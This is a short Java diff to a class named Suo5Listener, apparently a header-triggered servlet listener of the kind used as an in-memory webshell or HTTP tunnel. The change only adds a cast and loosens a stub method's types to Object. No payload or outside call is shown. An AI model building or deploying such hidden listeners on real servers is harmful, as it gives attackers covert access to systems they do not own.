@@ -545,7 +545,7 @@ public class Suo5Listener implements ServletRequestListener, Runnable, HostnameV
         try {
             if (request.getHeader(headerName) != null
                     && request.getHeader(headerName).contains(headerValue)) {
-                HttpServletResponse response = getResponseFromRequest(request);
+                HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
                 String contentType = request.getContentType();
                 if (contentType == null) {
                     return;
@@ -570,7 +570,7 @@ public class Suo5Listener implements ServletRequestListener, Runnable, HostnameV
         }
     }
 
-    private HttpServletResponse getResponseFromRequest(HttpServletRequest request) throws Exception {
+    private Object getResponseFromRequest(Object request) throws Exception {
         return null;
     }
 }
